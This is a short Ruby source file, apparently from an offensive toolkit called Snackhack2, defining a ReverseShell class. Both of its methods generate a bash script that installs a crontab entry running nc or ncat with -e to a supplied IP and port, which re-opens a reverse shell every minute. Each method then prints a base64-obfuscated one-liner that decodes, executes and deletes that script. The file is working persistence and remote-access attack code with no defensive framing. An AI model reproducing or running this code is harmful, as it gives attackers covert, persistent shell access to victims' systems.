require 'base64'
module Snackhack2
  class ReverseShell
    def initialize(ip, port)
      @ip   = ip
      @port = port
    end

    def run
      c = %Q{#!/bin/bash
			line="* * * * * nc -e /bin/sh #{@ip} #{@port}"
			(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}
      puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
    end
    def version2
    	c = %Q{#!/bin/bash
			line="* * * * * ncat #{@ip} #{@port} -e /bin/bash"
			(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}	
    	puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
    end
  end
end
